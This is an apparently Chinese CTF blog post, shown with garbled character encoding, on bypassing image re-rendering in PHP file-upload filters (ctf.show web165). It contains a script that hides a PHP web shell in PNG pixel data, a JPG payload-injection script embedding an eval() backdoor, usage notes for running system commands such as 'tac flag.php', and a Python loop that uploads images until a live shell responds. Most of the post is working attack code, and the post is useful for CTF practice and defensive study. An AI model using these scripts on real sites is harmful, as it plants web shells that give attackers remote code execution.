---
title: æ–‡ä»¶ä¸Šä¼ ---äºŒæ¬¡æ¸²æŸ“
date: 2024-07-31 23:01:40
permalink: /pages/d3df81/
categories:
  - web
tags:
  - php
author: 
  name: ajay
  link: https://the0n3.top
---
# æ–‡ä»¶ä¸Šä¼ ---äºŒæ¬¡æ¸²æŸ“

è¿™ç¯‡ä¸»è¦è®²jpgçš„äºŒæ¬¡æ¸²æŸ“ï¼Œå¯èƒ½å­˜åœ¨é”™è¯¯æˆ–è¯´æ³•ä¸å¯¹ï¼Œæ¬¢è¿å¸ˆå‚…ä»¬æŒ‡æ­£ï¼ï¼

## PNGäºŒæ¬¡æ¸²æŸ“

è„šæœ¬ç›´æ¥æ¢­å“ˆ

```php
<?php
$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,
           0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,
           0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,
           0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,
           0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,
           0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,
           0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,
           0x66, 0x44, 0x50, 0x33);
 
 
 
$img = imagecreatetruecolor(32, 32);
 
for ($y = 0; $y < sizeof($p); $y += 3) {
   $r = $p[$y];
   $g = $p[$y+1];
   $b = $p[$y+2];
   $color = imagecolorallocate($img, $r, $g, $b);
   imagesetpixel($img, round($y / 3), 0, $color);
}
imagepng($img,'1.png');  //è¦ä¿®æ”¹çš„å›¾ç‰‡çš„è·¯å¾„
 
/* æœ¨é©¬å†…å®¹
<?$_GET[0]($_POST[1]);?>
 */
//imagepng($img,'1.png');  è¦ä¿®æ”¹çš„å›¾ç‰‡çš„è·¯å¾„,1.pngæ˜¯ä½¿ç”¨çš„æ–‡ä»¶ï¼Œå¯ä»¥ä¸å­˜åœ¨
//ä¼šåœ¨ç›®å½•ä¸‹è‡ªåŠ¨åˆ›å»ºä¸€ä¸ª1.pngå›¾ç‰‡
//å›¾ç‰‡è„šæœ¬å†…å®¹ï¼š$_GET[0]($_POST[1]);
//ä½¿ç”¨æ–¹æ³•ï¼šä¾‹å­ï¼šæŸ¥çœ‹å›¾ç‰‡ï¼Œgetä¼ å…¥0=systemï¼›postä¼ å…¥tac flag.php
?>
```

## JPGäºŒæ¬¡æ¸²æŸ“

æ¨èï¼š[ctfshow web165 jpgäºŒæ¬¡æ¸²æŸ“](https://ctf.show/challenges#web165-608)

:::warning
jpgäºŒæ¬¡æ¸²æŸ“å›¾ç‰‡é©¬ä¸èƒ½é è„šæœ¬ç›´æ¥ç”Ÿæˆï¼Œä½ éœ€è¦å…ˆä¸Šä¼ åŸå›¾ï¼Œå†ctrl+sæŠŠæ¸²æŸ“åçš„å›¾ç‰‡å†ä¿å­˜ä¸‹æ¥ï¼Œç°åœ¨ä½ æ‰å¯ä»¥ä½¿ç”¨ä¸‹é¢è„šæœ¬å†æ¬¡æ¸²æŸ“

æ­¤å¤„å¡ç”šä¹…ï¼Œå‘Šä¹‹åæ¥è€…
:::

æŠŠç½‘ç«™æ¸²æŸ“è¿‡ä¸€æ¬¡çš„å›¾ç‰‡ä¿å­˜ä¸‹æ¥ï¼Œä½¿ç”¨ä¸‹é¢è„šæœ¬å†æ¬¡æ¸²æŸ“

jpgäºŒæ¬¡æ¸²æŸ“è„šæœ¬

```php
<?php
    /*
å°†æœ‰æ•ˆè½½è·æ³¨å…¥JPGå›¾åƒçš„ç®—æ³•ï¼Œè¯¥ç®—æ³•åœ¨PHPå‡½æ•°imagecopyresized()å’Œimagecopyresampled()å¼•èµ·çš„å˜æ¢åä¿æŒä¸å˜ã€‚
åˆå§‹å›¾åƒçš„å¤§å°å’Œè´¨é‡å¿…é¡»ä¸å¤„ç†åçš„å›¾åƒçš„å¤§å°å’Œè´¨é‡ç›¸åŒã€‚
1)é€šè¿‡å®‰å…¨æ–‡ä»¶ä¸Šä¼ è„šæœ¬ä¸Šä¼ ä»»æ„å›¾åƒ
2)ä¿å­˜å¤„ç†åçš„å›¾åƒå¹¶å¯åŠ¨:
php æ–‡ä»¶å.php <æ–‡ä»¶å.jpg >
å¦‚æœæ³¨å°„æˆåŠŸï¼Œæ‚¨å°†è·å¾—ä¸€ä¸ªç‰¹åˆ¶çš„å›¾åƒï¼Œè¯¥å›¾åƒåº”å†æ¬¡ä¸Šä¼ ã€‚
ç”±äºä½¿ç”¨äº†æœ€ç›´æ¥çš„æ³¨å°„æ–¹æ³•ï¼Œå¯èƒ½ä¼šå‡ºç°ä»¥ä¸‹é—®é¢˜:
1)åœ¨ç¬¬äºŒæ¬¡å¤„ç†ä¹‹åï¼Œæ³¨å…¥çš„æ•°æ®å¯èƒ½å˜å¾—éƒ¨åˆ†æŸåã€‚
jpg _ payload.phpè„šæœ¬è¾“å‡ºâ€œæœ‰é—®é¢˜â€ã€‚
å¦‚æœå‘ç”Ÿè¿™ç§æƒ…å†µï¼Œè¯·å°è¯•æ›´æ”¹æœ‰æ•ˆè½½è·(ä¾‹å¦‚ï¼Œåœ¨å¼€å¤´æ·»åŠ ä¸€äº›ç¬¦å·)æˆ–å°è¯•å¦ä¸€ä¸ªåˆå§‹å›¾åƒã€‚
è°¢å°”ç›–Â·åšå¸ƒç½—å¤«@Black2Fanã€‚
å¦è¯·å‚è§:
https://www . idontplaydarts . com/2012/06/encoding-we B- shell-in-png-idat-chunks/
*/

    $miniPayload = '<?=eval($_POST[1]);?>';
 
 
    if(!extension_loaded('gd') || !function_exists('imagecreatefromjpeg')) {
        die('php-gd is not installed');
    }
    
    if(!isset($argv[1])) {
        die('php jpg_payload.php <jpg_name.jpg>');
    }
 
    set_error_handler("custom_error_handler");
 
    for($pad = 0; $pad < 1024; $pad++) {
        $nullbytePayloadSize = $pad;
        $dis = new DataInputStream($argv[1]);
        $outStream = file_get_contents($argv[1]);
        $extraBytes = 0;
        $correctImage = TRUE;
 
        if($dis->readShort() != 0xFFD8) {
            die('Incorrect SOI marker');
        }
 
        while((!$dis->eof()) && ($dis->readByte() == 0xFF)) {
            $marker = $dis->readByte();
            $size = $dis->readShort() - 2;
            $dis->skip($size);
            if($marker === 0xDA) {
                $startPos = $dis->seek();
                $outStreamTmp = 
                    substr($outStream, 0, $startPos) . 
                    $miniPayload . 
                    str_repeat("\0",$nullbytePayloadSize) . 
                    substr($outStream, $startPos);
                checkImage('_'.$argv[1], $outStreamTmp, TRUE);
                if($extraBytes !== 0) {
                    while((!$dis->eof())) {
                        if($dis->readByte() === 0xFF) {
                            if($dis->readByte !== 0x00) {
                                break;
                            }
                        }
                    }
                    $stopPos = $dis->seek() - 2;
                    $imageStreamSize = $stopPos - $startPos;
                    $outStream = 
                        substr($outStream, 0, $startPos) . 
                        $miniPayload . 
                        substr(
                            str_repeat("\0",$nullbytePayloadSize).
                                substr($outStream, $startPos, $imageStreamSize),
                            0,
                            $nullbytePayloadSize+$imageStreamSize-$extraBytes) . 
                                substr($outStream, $stopPos);
                } elseif($correctImage) {
                    $outStream = $outStreamTmp;
                } else {
                    break;
                }
                if(checkImage('payload_'.$argv[1], $outStream)) {
                    die('Success!');
                } else {
                    break;
                }
            }
        }
    }
    unlink('payload_'.$argv[1]);
    die('Something\'s wrong');
 
    function checkImage($filename, $data, $unlink = FALSE) {
        global $correctImage;
        file_put_contents($filename, $data);
        $correctImage = TRUE;
        imagecreatefromjpeg($filename);
        if($unlink)
            unlink($filename);
        return $correctImage;
    }
 
    function custom_error_handler($errno, $errstr, $errfile, $errline) {
        global $extraBytes, $correctImage;
        $correctImage = FALSE;
        if(preg_match('/(\d+) extraneous bytes before marker/', $errstr, $m)) {
            if(isset($m[1])) {
                $extraBytes = (int)$m[1];
            }
        }
    }
 
    class DataInputStream {
        private $binData;
        private $order;
        private $size;
 
        public function __construct($filename, $order = false, $fromString = false) {
            $this->binData = '';
            $this->order = $order;
            if(!$fromString) {
                if(!file_exists($filename) || !is_file($filename))
                    die('File not exists ['.$filename.']');
                $this->binData = file_get_contents($filename);
            } else {
                $this->binData = $filename;
            }
            $this->size = strlen($this->binData);
        }
 
        public function seek() {
            return ($this->size - strlen($this->binData));
        }
 
        public function skip($skip) {
            $this->binData = substr($this->binData, $skip);
        }
 
        public function readByte() {
            if($this->eof()) {
                die('End Of File');
            }
            $byte = substr($this->binData, 0, 1);
            $this->binData = substr($this->binData, 1);
            return ord($byte);
        }
 
        public function readShort() {
            if(strlen($this->binData) < 2) {
                die('End Of File');
            }
            $short = substr($this->binData, 0, 2);
            $this->binData = substr($this->binData, 2);
            if($this->order) {
                $short = (ord($short[1]) << 8) + ord($short[0]);
            } else {
                $short = (ord($short[0]) << 8) + ord($short[1]);
            }
            return $short;
        }
 
        public function eof() {
            return !$this->binData||(strlen($this->binData) === 0);
        }
    }
?>
```

```bash
# ç”ŸæˆäºŒæ¬¡æ¸²æŸ“çš„jpgå›¾ç‰‡
php æ–‡ä»¶å.php æ–‡ä»¶å.jpg
```

![gen](https://the0n3.top/medias/show-upload/24.png)


```php
# æ¸²æŸ“åphpæœ¨é©¬å†…å®¹
<?=eval($_POST[1]);?>
```

å¦‚æœæ˜¯è‡ªå·±å‡†å¤‡çš„å›¾ç‰‡ï¼Œä¸Šä¼ åå¤§æ¦‚ä¼šå¤±è´¥

CTFshowç¾¤ä¸»æ¨èçš„äºŒæ¬¡æ¸²æŸ“ä¸“ç”¨å›¾
![jpg](https://the0n3.top/medias/show-upload/0.jpg)

æˆ‘å‡†å¤‡äº†ä¸€ä¸ªè„šæœ¬(æ¿€åŠ¨ï¼Œç»ˆäºæˆåŠŸäº†ï¼Œå¸ˆå‚…ä»¬ä¸€å®šè¦è¯•ä¸€è¯•ï¼ï¼ï¼)

```python
import requests
import random
import string

# é…ç½®
image_path = 'payload_cola1.jpg'  # å›¾ç‰‡è·¯å¾„
url = 'http://0092bb15-7d1d-4a6c-8f9d-c9ac4a6076fa.challenge.ctf.show/'
upload_url = url + 'upload.php'  # ä¸Šä¼ æ¥å£ URL
get_url = url + 'download.php?image='  # è®¿é—®æ¥å£
output_path = 'success_image1.jpg'  # ä¿å­˜è·¯å¾„

def generate_random_string(length):
    characters = string.ascii_letters + string.digits + string.punctuation
    return ''.join(random.choice(characters) for _ in range(length))

# è¯»å–å›¾ç‰‡æ–‡ä»¶
with open(image_path, 'rb') as image_file:
    image_data = image_file.read()

while True:
    # ç”Ÿæˆ30åˆ°50ä½é•¿åº¦çš„éšæœºå­—ç¬¦ä¸²
    random_length = random.randint(30, 50)
    text_to_append = generate_random_string(random_length).encode('utf-8')  # è¦è¿½åŠ çš„æ–‡æœ¬

    # è¿½åŠ æ–‡æœ¬åˆ°å›¾ç‰‡æ•°æ®
    modified_image_data = image_data + text_to_append
    # åœ¨å›¾ç‰‡æ•°æ®å¼€å¤´æ’å…¥æ–‡æœ¬ï¼ŒæŠ¥é”™
    # modified_image_data = text_to_append + image_data

    # å‡†å¤‡ä¸Šä¼ 
    files = {'file': ('modified_image.jpg', modified_image_data, 'image/jpeg')}
    response = requests.post(upload_url, files=files)
    # è·å–ä¸Šä¼ åçš„çŠ¶æ€ã€æ–‡ä»¶å
    response_json = response.json()
    msg = response_json.get("msg")

    # æ£€æŸ¥å“åº”
    if response.status_code == 200:
        print('ä¸Šä¼ æˆåŠŸ' + f"-----æ–‡ä»¶å {msg}")
        
        # æµ‹è¯•å›¾ç‰‡æ¥å£
        img_url = get_url + str(msg)
        test_resp = requests.get(img_url)
        if test_resp.status_code == 200:
            print("å›¾ç‰‡æµ‹è¯•æˆåŠŸ")
            data = {"1":"phpinfo();"}
            eval_resp = requests.post(img_url,data=data)
            if "phpinfo" in eval_resp.text:
                print("æœ¨é©¬å·²å­˜æ´»...")
                # åœ¨æˆåŠŸæ£€æµ‹åˆ°æœ¨é©¬æ–‡ä»¶åä¿å­˜ä¿®æ”¹åçš„æ–‡ä»¶
                with open(output_path, 'wb') as output_file:
                    output_file.write(modified_image_data)
                print(f'ä¿®æ”¹åçš„æ–‡ä»¶å·²ä¿å­˜åˆ°: {output_path}')
                break
            else:
                print("æ­£åœ¨ç”Ÿæˆæœ¨é©¬")
        else:
            print("å›¾ç‰‡ä¸Šä¼ å¤±è´¥ï¼Œè¯·æ£€æŸ¥å›¾ç‰‡")
    else:
        print(f'ä¸Šä¼ å¤±è´¥ï¼ŒçŠ¶æ€ç : {response.status_code}')
        print(f'å“åº”å†…å®¹: {response.text}')

```
![res](https://the0n3.top/medias/show-upload/res1.png)

æ”¾3ç»„å›¾ï¼Œåˆ†åˆ«æ˜¯åŸå›¾ï¼Œä¸€æ¬¡æ¸²æŸ“å›¾ï¼Œä»¥åŠæˆæœå›¾
![åŸå›¾](https://the0n3.top/medias/show-upload/cola.jpg) 
![ä¸€æ¬¡æ¸²æŸ“å›¾](https://the0n3.top/medias/show-upload/payload_cola.jpg)
![æˆæœå›¾](https://the0n3.top/medias/show-upload/success_image.jpg)

å†è¯•ä¸€æ¬¡...
![res](https://the0n3.top/medias/show-upload/res2.png)

è·‘ä¸€ä¸‹æŸ´éƒ¡
åŸå›¾
![ori](https://the0n3.top/medias/show-upload/cj.jpg)
ä¸€æ¬¡æ¸²æŸ“
![one](https://the0n3.top/medias/show-upload/payload_cola1.jpg)
æˆæœå›¾
![two](https://the0n3.top/medias/show-upload/success_image1.jpg)

![res](https://the0n3.top/medias/show-upload/cjres.png)

:::waring
æ³¨æ„ï¼šæ­¤è„šæœ¬å¹¶æœªå®Œå–„ï¼Œå­˜åœ¨å·²çŸ¥bugï¼šå›¾ç‰‡æ¥å—è„šæœ¬å¤„ç†åå¯èƒ½æŸåï¼Œå› æ­¤ä¼šæ— æ•ˆæ­»å¾ªç¯
:::

## æœ€å

ä»€ä¹ˆï¼Ÿä½ å‘ç°è¿™æ˜¯[CTFshow æ–‡ä»¶ä¸Šä¼ web151-170](https://the0n3.top/pages/06f28c/)è¿™ç¯‡æ–‡ç« çš„èŠ‚é€‰ï¼Ÿå†æ°´è¿™ä¸€æ¬¡(ğŸ˜„)